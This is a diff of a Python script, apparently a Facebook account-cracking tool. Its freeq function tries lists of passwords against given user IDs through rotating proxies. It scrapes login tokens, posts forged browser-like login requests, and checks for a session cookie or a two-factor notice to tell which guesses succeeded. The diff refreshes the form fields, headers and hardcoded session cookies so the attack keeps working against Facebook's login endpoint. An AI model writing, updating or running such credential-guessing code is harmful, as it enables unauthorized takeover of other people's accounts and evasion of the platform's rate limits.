@@ -1672,56 +1672,66 @@ def freeq(uid,pwx,tl):
         for pw in pwx:
             nip=random.choice(xvx)
             proxs= {'http': nip}
-            ua = random.choice(uas)
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/').text
+            free_fb = Session.get('https://touch.facebook.com').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '2',
             'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '104202_oWIO',
-            'lgnjs': '1733078522',
-            'ab_test_data': '//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/VABAAH',
-            'locale': 'bn_IN',
-            'next': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348131',
-            'login_source': 'login_bluebar',
-            'guid': 'f1fa4a8538181c5c6',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
+            'lgnrnd': '104423_iIof',
+            'lgnjs': '1733165065',
+            'email': uid,
             'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
+            'prefill_source': '',
+            'prefill_type': 'contact_point',
+            'first_prefill_source': '',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'false',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqV^%^2F^%^2FAVAAAAFAE',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnTf_7.AWVpDy9HdWE',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',
+            'sfau': 'AYiXwRf6w9LrJM3e68tRDNnP4n9ZudONoMXaOqwgSieQfSkQFBWuauURAUPbdvQU7iCjZGu-1CbA7V4XIDLCdK2eOktmo1ZD_6YIq1HvKK_W584XnARioXs2RjzLcb6lVxvl0kr60PEohZDH76VSXNFn17yVUX7-dkBbzlkOYk7RHaBonBXv5_nGh-xPvH_p5CisjaXz_41Q9fyr8sHPLfPTUjvh1MDdOG5SFgL7BXYwiZ2SzjvyFqYWSmobi7I3ed2QaSACCLJwNrY3fY5KKv4C',
+            'sfiu': 'AYhnD_pdzBJQEE86DsEw4mlSkyBkphy4P5A27esTyrVJBDejQiAdmH9t3Rc13UXt-scXkchI5aWrGAirxl60nddzWjnjYjfW9k53WNx69g4HWaSpFyGdOLuy7_G6eIiTubm32rGUWJouN1pGkJqOtblCc6PQo89kFpGt-zT7JsHdbsw5wOfPNKkAeuEI12mP4Tu9XPTUmd2nEn1XEbv2-fl4pYoLKonvLZ-7TbPeqw-S9cgugfIoH6-gtmvV0gvhRnFpHUVmgW8WNXN49ZixyN-9',}
             headers = {
-            'authority': 'web.facebook.com',
-            'method': 'POST',
-            'path': '/login/device-based/regular/login/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://web.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://web.facebook.com/?ref=homescreenpwa',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.70", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
-            'viewport-width': '1440',}
+            "Host": "web.facebook.com",
+            "content-length": str(len((data))),
+            "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="131"',
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+            "x-response-format": "JSONStream",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "viewport-width": "360",
+            "x-requested-with": "XMLHttpRequest",
+            "x-asbd-id": "129477",
+            "dpr": "2",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua-platform": '"Android"',
+            "accept": "*/*",
+            "origin": "https://web.facebook.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": 'https://web.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://web.facebook.com/login/device-based/regular/login/?"
-            po = Session.post(url, data=data, headers=headers).text
+            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
